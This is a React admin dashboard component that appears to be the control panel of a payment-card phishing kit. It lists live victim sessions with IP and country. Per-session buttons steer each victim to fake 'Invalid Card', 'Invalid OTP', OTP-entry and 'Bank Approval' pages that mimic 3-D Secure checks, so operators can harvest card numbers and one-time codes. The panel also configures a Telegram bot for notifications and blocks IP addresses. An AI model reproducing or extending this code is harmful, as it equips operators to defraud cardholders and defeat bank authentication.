'use client';

import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogTitle, AlertDialogTrigger } from '@/components/ui/alert-dialog';
import { Badge } from '@/components/ui/badge';
import { Trash2, LogOut, Lock, Unlock, Ban, CreditCard, LockIcon, Smartphone, CheckCircle, Globe, Monitor, Chrome, Copy, Settings, X, Eye, EyeOff, Save, AlertCircle, CheckCircle2, Loader2 } from 'lucide-react';
import { toast } from 'sonner';

interface UserSession {
  id: string;
  currentPage: string;
  lastActive: number;
  userState: 'invalid_card' | 'invalid_otp' | '3d-secure-otp' | '3d-secure-app' | 'block' | 'normal';
  ip?: string;
  country?: string;
  device?: string;
  browser?: string;
  createdAt?: number;
  isActive?: boolean;
  lastSeen?: number;
}

type ControlAction = 'invalid_card' | 'invalid_otp' | '3d-secure-otp' | '3d-secure-app' | 'block' | 'normal';

const ADMIN_AUTH_KEY = 'admin_auth_token';

export function AdminDashboard() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [sessions, setSessions] = useState<UserSession[]>([]);
  const [loading, setLoading] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState('sessions');
  
  // Telegram Config State
  const [telegramBotToken, setTelegramBotToken] = useState('');
  const [telegramChatId, setTelegramChatId] = useState('');
  const [showBotToken, setShowBotToken] = useState(false);
  const [telegramLoading, setTelegramLoading] = useState(false);
  
  // Blocked IPs State
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [newBlockedIp, setNewBlockedIp] = useState('');
  
  // Admin Password State
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showCurrentPassword, setShowCurrentPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [passwordLoading, setPasswordLoading] = useState(false);

  // Check for existing auth token on mount
  useEffect(() => {
    const token = localStorage.getItem(ADMIN_AUTH_KEY);
    if (token) {
      verifyToken(token);
    }
  }, []);

  const verifyToken = async (token: string) => {
    try {
      const response = await fetch('/api/admin/auth', {
        headers: { 'Authorization': `Bearer ${token}` },
      });
      if (response.ok) {
        setIsAuthenticated(true);
        fetchSessions();
        fetchConfig();
        const interval = setInterval(fetchSessions, 2000);
        return () => clearInterval(interval);
      } else {
        localStorage.removeItem(ADMIN_AUTH_KEY);
      }
    } catch (error) {
      console.error('Token verification failed:', error);
      localStorage.removeItem(ADMIN_AUTH_KEY);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const response = await fetch('/api/admin/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password }),
      });

      if (response.ok) {
        const data = await response.json();
        localStorage.setItem(ADMIN_AUTH_KEY, data.token);
        setIsAuthenticated(true);
        setPassword('');
        fetchSessions();
        fetchConfig();
        toast.success('Successfully logged in');
        const interval = setInterval(fetchSessions, 2000);
        return () => clearInterval(interval);
      } else {
        toast.error('Incorrect password');
        setPassword('');
      }
    } catch (error) {
      console.error('Login failed:', error);
      toast.error('Login failed');
    } finally {
      setLoading(false);
    }
  };

  const fetchSessions = async () => {
    try {
      const response = await fetch('/api/admin/sessions');
      if (response.ok) {
        const data = await response.json();
        setSessions(data);
      }
    } catch (error) {
      console.error('Failed to fetch sessions:', error);
    }
  };

  const fetchConfig = async () => {
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch('/api/admin/config', {
        headers: { 'Authorization': `Bearer ${token}` },
      });
      if (response.ok) {
        const data = await response.json();
        setBlockedIps(data.blockedIps || []);
        setTelegramChatId(data.telegramChatId || '');
      }
    } catch (error) {
      console.error('Failed to fetch config:', error);
    }
  };

  const handleUpdateTelegramConfig = async () => {
    if (!telegramBotToken || !telegramChatId) {
      toast.error('Please fill in both Telegram fields');
      return;
    }

    setTelegramLoading(true);
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch('/api/admin/config', {
        method: 'PUT',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({
          telegramBotToken,
          telegramChatId,
        }),
      });

      if (response.ok) {
        toast.success('Telegram configuration updated successfully!');
        setTelegramBotToken('');
      } else {
        toast.error('Failed to update configuration');
      }
    } catch (error) {
      console.error('Failed to update config:', error);
      toast.error('Failed to update configuration');
    } finally {
      setTelegramLoading(false);
    }
  };

  const handleUpdatePassword = async () => {
    if (!currentPassword || !newPassword || !confirmPassword) {
      toast.error('Please fill in all password fields');
      return;
    }

    if (newPassword !== confirmPassword) {
      toast.error('New passwords do not match');
      return;
    }

    if (newPassword.length < 4) {
      toast.error('New password must be at least 4 characters');
      return;
    }

    setPasswordLoading(true);
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch('/api/admin/password', {
        method: 'PUT',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({
          currentPassword,
          newPassword,
        }),
      });

      if (response.ok) {
        toast.success('Admin password updated successfully!');
        setCurrentPassword('');
        setNewPassword('');
        setConfirmPassword('');
      } else if (response.status === 403) {
        toast.error('Incorrect current password');
      } else {
        toast.error('Failed to update password');
      }
    } catch (error) {
      console.error('Failed to update password:', error);
      toast.error('Failed to update password');
    } finally {
      setPasswordLoading(false);
    }
  };

  const handleBlockIp = async () => {
    if (!newBlockedIp) {
      toast.error('Please enter an IP address');
      return;
    }

    setLoading(true);
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({
          action: 'block',
          ip: newBlockedIp,
        }),
      });

      if (response.ok) {
        const data = await response.json();
        setBlockedIps(data.blockedIps);
        setNewBlockedIp('');
        toast.success(`IP ${newBlockedIp} has been blocked`);
      }
    } catch (error) {
      console.error('Failed to block IP:', error);
      toast.error('Failed to block IP');
    } finally {
      setLoading(false);
    }
  };

  const handleUnblockIp = async (ip: string) => {
    setLoading(true);
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({
          action: 'unblock',
          ip,
        }),
      });

      if (response.ok) {
        const data = await response.json();
        setBlockedIps(data.blockedIps);
        toast.success(`IP ${ip} has been unblocked`);
      }
    } catch (error) {
      console.error('Failed to unblock IP:', error);
      toast.error('Failed to unblock IP');
    } finally {
      setLoading(false);
    }
  };

  const handleControlAction = async (sessionId: string, action: ControlAction, ip?: string) => {
    setLoading(true);
    try {
      const response = await fetch('/api/admin/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          action,
          ip,
        }),
      });

      if (response.ok) {
        const actionLabels: Record<ControlAction, string> = {
          'invalid_card': 'Invalid Card',
          'invalid_otp': 'Invalid OTP',
          '3d-secure-otp': 'OTP Page',
          '3d-secure-app': 'Bank Approval',
          'block': 'Block',
          'normal': 'Normal',
        };
        toast.success(`${actionLabels[action]} command sent successfully`);
        fetchSessions();
      }
    } catch (error) {
      console.error('Failed to send control command:', error);
      toast.error('Failed to send control command');
    } finally {
      setLoading(false);
    }
  };

  const handleDeleteSession = async (sessionId: string) => {
    setLoading(true);
    try {
      const response = await fetch('/api/admin/sessions', {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId }),
      });

      if (response.ok) {
        toast.success('Session deleted successfully');
        fetchSessions();
      }
    } catch (error) {
      console.error('Failed to delete session:', error);
      toast.error('Failed to delete session');
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem(ADMIN_AUTH_KEY);
    setIsAuthenticated(false);
    setSessions([]);
    setPassword('');
    toast.success('Logged out successfully');
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    toast.success('Copied to clipboard');
    setTimeout(() => setCopiedId(null), 2000);
  };

  const formatTime = (timestamp: number) => {
    const date = new Date(timestamp);
    return date.toLocaleTimeString();
  };

  const getStateColor = (state: string) => {
    switch (state) {
      case 'invalid_card':
        return 'bg-orange-900/30 text-orange-300 border-orange-700';
      case 'invalid_otp':
        return 'bg-red-900/30 text-red-300 border-red-700';
      case '3d-secure-otp':
        return 'bg-blue-900/30 text-blue-300 border-blue-700';
      case '3d-secure-app':
        return 'bg-purple-900/30 text-purple-300 border-purple-700';
      case 'block':
        return 'bg-red-900/30 text-red-300 border-red-700';
      default:
        return 'bg-green-900/30 text-green-300 border-green-700';
    }
  };

  const getStateIcon = (state: string) => {
    switch (state) {
      case 'invalid_card':
        return <CreditCard className="w-4 h-4" />;
      case 'invalid_otp':
        return <LockIcon className="w-4 h-4" />;
      case '3d-secure-otp':
        return <Smartphone className="w-4 h-4" />;
      case '3d-secure-app':
        return <CheckCircle className="w-4 h-4" />;
      case 'block':
        return <Ban className="w-4 h-4" />;
      default:
        return <CheckCircle className="w-4 h-4" />;
    }
  };

  const getStateLabel = (state: string) => {
    switch (state) {
      case 'invalid_card':
        return 'Invalid Card';
      case 'invalid_otp':
        return 'Invalid OTP';
      case '3d-secure-otp':
        return 'OTP Page';
      case '3d-secure-app':
        return 'Bank Approval';
      case 'block':
        return 'Blocked';
      default:
        return 'Active';
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center p-4">
        <Card className="w-full max-w-md bg-slate-800 border-slate-700">
          <CardHeader className="space-y-2">
            <CardTitle className="text-2xl text-white">Admin Dashboard</CardTitle>
            <CardDescription>Enter your password to access the admin panel</CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin} className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium text-slate-200">Password</label>
                <Input
                  type="password"
                  placeholder="Enter admin password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="bg-slate-700 border-slate-600 text-white placeholder-slate-400"
                  disabled={loading}
                />
              </div>
              <Button 
                type="submit" 
                className="w-full bg-blue-600 hover:bg-blue-700"
                disabled={loading}
              >
                {loading ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : null}
                {loading ? 'Logging in...' : 'Log In'}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 p-4 md:p-8">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex justify-between items-center mb-8">
          <div>
            <h1 className="text-3xl md:text-4xl font-bold text-white">Admin Dashboard</h1>
            <p className="text-slate-400 mt-2">Manage sessions, Telegram configuration, and security settings</p>
          </div>
          <Button 
            onClick={handleLogout}
            className="bg-red-600 hover:bg-red-700"
          >
            <LogOut className="w-4 h-4 mr-2" />
            Logout
          </Button>
        </div>

        {/* Main Content */}
        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
          <TabsList className="grid w-full grid-cols-3 bg-slate-800 border-slate-700">
            <TabsTrigger value="sessions" className="text-slate-300 data-[state=active]:text-white data-[state=active]:bg-slate-700">
              Active Sessions
            </TabsTrigger>
            <TabsTrigger value="telegram" className="text-slate-300 data-[state=active]:text-white data-[state=active]:bg-slate-700">
              Telegram Config
            </TabsTrigger>
            <TabsTrigger value="security" className="text-slate-300 data-[state=active]:text-white data-[state=active]:bg-slate-700">
              Security
            </TabsTrigger>
          </TabsList>

          {/* Sessions Tab */}
          <TabsContent value="sessions" className="space-y-4 mt-6">
            <div className="grid gap-4">
              {sessions.length === 0 ? (
                <Card className="bg-slate-800 border-slate-700">
                  <CardContent className="pt-6 text-center">
                    <p className="text-slate-400">No active sessions</p>
                  </CardContent>
                </Card>
              ) : (
                sessions.map((session) => (
                  <Card key={session.id} className="bg-slate-800 border-slate-700 overflow-hidden">
                    <CardHeader className="pb-3">
                      <div className="flex justify-between items-start">
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-2">
                            <Badge className={`${getStateColor(session.userState)} border`}>
                              {getStateIcon(session.userState)}
                              <span className="ml-1">{getStateLabel(session.userState)}</span>
                            </Badge>
                          </div>
                          <p className="text-sm text-slate-400">Session ID: {session.id}</p>
                        </div>
                        <AlertDialog>
                          <AlertDialogTrigger asChild>
                            <Button 
                              variant="ghost" 
                              size="sm"
                              className="text-red-400 hover:text-red-300 hover:bg-red-900/20"
                            >
                              <Trash2 className="w-4 h-4" />
                            </Button>
                          </AlertDialogTrigger>
                          <AlertDialogContent className="bg-slate-800 border-slate-700">
                            <AlertDialogTitle className="text-white">Delete Session</AlertDialogTitle>
                            <AlertDialogDescription className="text-slate-400">
                              Are you sure you want to delete this session? This action cannot be undone.
                            </AlertDialogDescription>
                            <div className="flex gap-2 justify-end">
                              <AlertDialogCancel className="bg-slate-700 text-white hover:bg-slate-600">Cancel</AlertDialogCancel>
                              <AlertDialogAction 
                                onClick={() => handleDeleteSession(session.id)}
                                className="bg-red-600 hover:bg-red-700"
                              >
                                Delete
                              </AlertDialogAction>
                            </div>
                          </AlertDialogContent>
                        </AlertDialog>
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm">
                        <div className="bg-slate-700/50 p-3 rounded">
                          <p className="text-slate-400 text-xs">Current Page</p>
                          <p className="text-white font-medium">{session.currentPage}</p>
                        </div>
                        <div className="bg-slate-700/50 p-3 rounded">
                          <p className="text-slate-400 text-xs">Country</p>
                          <p className="text-white font-medium">{session.country || 'N/A'}</p>
                        </div>
                        <div className="bg-slate-700/50 p-3 rounded">
                          <p className="text-slate-400 text-xs">IP Address</p>
                          <p className="text-white font-medium text-xs">{session.ip || 'N/A'}</p>
                        </div>
                        <div className="bg-slate-700/50 p-3 rounded">
                          <p className="text-slate-400 text-xs">Last Active</p>
                          <p className="text-white font-medium">{formatTime(session.lastActive)}</p>
                        </div>
                      </div>

                      {/* Control Actions */}
                      <div className="pt-3 border-t border-slate-700">
                        <p className="text-sm font-medium text-slate-300 mb-3">Control Actions</p>
                        <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleControlAction(session.id, 'invalid_card', session.ip)}
                            disabled={loading}
                            className="border-orange-700 text-orange-300 hover:bg-orange-900/20"
                          >
                            <CreditCard className="w-3 h-3 mr-1" />
                            Invalid Card
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleControlAction(session.id, 'invalid_otp', session.ip)}
                            disabled={loading}
                            className="border-red-700 text-red-300 hover:bg-red-900/20"
                          >
                            <LockIcon className="w-3 h-3 mr-1" />
                            Invalid OTP
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleControlAction(session.id, '3d-secure-otp', session.ip)}
                            disabled={loading}
                            className="border-blue-700 text-blue-300 hover:bg-blue-900/20"
                          >
                            <Smartphone className="w-3 h-3 mr-1" />
                            OTP Page
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleControlAction(session.id, '3d-secure-app', session.ip)}
                            disabled={loading}
                            className="border-purple-700 text-purple-300 hover:bg-purple-900/20"
                          >
                            <CheckCircle className="w-3 h-3 mr-1" />
                            Bank Approval
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleControlAction(session.id, 'normal', session.ip)}
                            disabled={loading}
                            className="border-green-700 text-green-300 hover:bg-green-900/20"
                          >
                            <CheckCircle2 className="w-3 h-3 mr-1" />
                            Normal
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleControlAction(session.id, 'block', session.ip)}
                            disabled={loading}
                            className="border-red-700 text-red-300 hover:bg-red-900/20"
                          >
                            <Ban className="w-3 h-3 mr-1" />
                            Block
                          </Button>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))
              )}
            </div>
          </TabsContent>

          {/* Telegram Config Tab */}
          <TabsContent value="telegram" className="space-y-4 mt-6">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white flex items-center gap-2">
                  <Globe className="w-5 h-5" />
                  Telegram Configuration
                </CardTitle>
                <CardDescription>Update your Telegram bot token and chat ID for notifications</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <label className="text-sm font-medium text-slate-200">Bot Token</label>
                  <div className="flex gap-2">
                    <Input
                      type={showBotToken ? "text" : "password"}
                      placeholder="Enter Telegram bot token"
                      value={telegramBotToken}
                      onChange={(e) => setTelegramBotToken(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white placeholder-slate-400 flex-1"
                      disabled={telegramLoading}
                    />
                    <Button
                      type="button"
                      variant="outline"
                      size="icon"
                      onClick={() => setShowBotToken(!showBotToken)}
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                    >
                      {showBotToken ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </Button>
                  </div>
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium text-slate-200">Chat ID</label>
                  <Input
                    type="text"
                    placeholder="Enter Telegram chat ID"
                    value={telegramChatId}
                    onChange={(e) => setTelegramChatId(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-400"
                    disabled={telegramLoading}
                  />
                </div>

                <div className="bg-blue-900/20 border border-blue-700 rounded p-3 text-sm text-blue-300">
                  <p className="flex items-start gap-2">
                    <AlertCircle className="w-4 h-4 mt-0.5 flex-shrink-0" />
                    <span>Changes will take effect immediately without requiring a redeploy.</span>
                  </p>
                </div>

                <Button
                  onClick={handleUpdateTelegramConfig}
                  disabled={telegramLoading || !telegramBotToken || !telegramChatId}
                  className="w-full bg-blue-600 hover:bg-blue-700"
                >
                  {telegramLoading ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />}
                  {telegramLoading ? 'Updating...' : 'Update Configuration'}
                </Button>
              </CardContent>
            </Card>

            {/* Blocked IPs Section */}
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white flex items-center gap-2">
                  <Ban className="w-5 h-5" />
                  Blocked IP Addresses
                </CardTitle>
                <CardDescription>Manage blocked IP addresses</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex gap-2">
                  <Input
                    type="text"
                    placeholder="Enter IP address to block"
                    value={newBlockedIp}
                    onChange={(e) => setNewBlockedIp(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white placeholder-slate-400 flex-1"
                    disabled={loading}
                  />
                  <Button
                    onClick={handleBlockIp}
                    disabled={loading || !newBlockedIp}
                    className="bg-red-600 hover:bg-red-700"
                  >
                    {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Ban className="w-4 h-4" />}
                  </Button>
                </div>

                {blockedIps.length === 0 ? (
                  <p className="text-slate-400 text-sm text-center py-4">No blocked IP addresses</p>
                ) : (
                  <div className="space-y-2">
                    {blockedIps.map((ip) => (
                      <div key={ip} className="flex items-center justify-between bg-slate-700/50 p-3 rounded">
                        <span className="text-white font-mono text-sm">{ip}</span>
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={() => handleUnblockIp(ip)}
                          disabled={loading}
                          className="text-green-400 hover:text-green-300 hover:bg-green-900/20"
                        >
                          <Unlock className="w-4 h-4" />
                        </Button>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* Security Tab */}
          <TabsContent value="security" className="space-y-4 mt-6">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white flex items-center gap-2">
                  <Lock className="w-5 h-5" />
                  Change Admin Password
                </CardTitle>
                <CardDescription>Update your admin panel password</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <label className="text-sm font-medium text-slate-200">Current Password</label>
                  <div className="flex gap-2">
                    <Input
                      type={showCurrentPassword ? "text" : "password"}
                      placeholder="Enter current password"
                      value={currentPassword}
                      onChange={(e) => setCurrentPassword(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white placeholder-slate-400 flex-1"
                      disabled={passwordLoading}
                    />
                    <Button
                      type="button"
                      variant="outline"
                      size="icon"
                      onClick={() => setShowCurrentPassword(!showCurrentPassword)}
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                    >
                      {showCurrentPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </Button>
                  </div>
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium text-slate-200">New Password</label>
                  <div className="flex gap-2">
                    <Input
                      type={showNewPassword ? "text" : "password"}
                      placeholder="Enter new password"
                      value={newPassword}
                      onChange={(e) => setNewPassword(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white placeholder-slate-400 flex-1"
                      disabled={passwordLoading}
                    />
                    <Button
                      type="button"
                      variant="outline"
                      size="icon"
                      onClick={() => setShowNewPassword(!showNewPassword)}
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                    >
                      {showNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </Button>
                  </div>
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium text-slate-200">Confirm New Password</label>
                  <div className="flex gap-2">
                    <Input
                      type={showConfirmPassword ? "text" : "password"}
                      placeholder="Confirm new password"
                      value={confirmPassword}
                      onChange={(e) => setConfirmPassword(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white placeholder-slate-400 flex-1"
                      disabled={passwordLoading}
                    />
                    <Button
                      type="button"
                      variant="outline"
                      size="icon"
                      onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                    >
                      {showConfirmPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </Button>
                  </div>
                </div>

                <div className="bg-amber-900/20 border border-amber-700 rounded p-3 text-sm text-amber-300">
                  <p className="flex items-start gap-2">
                    <AlertCircle className="w-4 h-4 mt-0.5 flex-shrink-0" />
                    <span>Password must be at least 4 characters long.</span>
                  </p>
                </div>

                <Button
                  onClick={handleUpdatePassword}
                  disabled={passwordLoading || !currentPassword || !newPassword || !confirmPassword}
                  className="w-full bg-green-600 hover:bg-green-700"
                >
                  {passwordLoading ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />}
                  {passwordLoading ? 'Updating...' : 'Update Password'}
                </Button>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
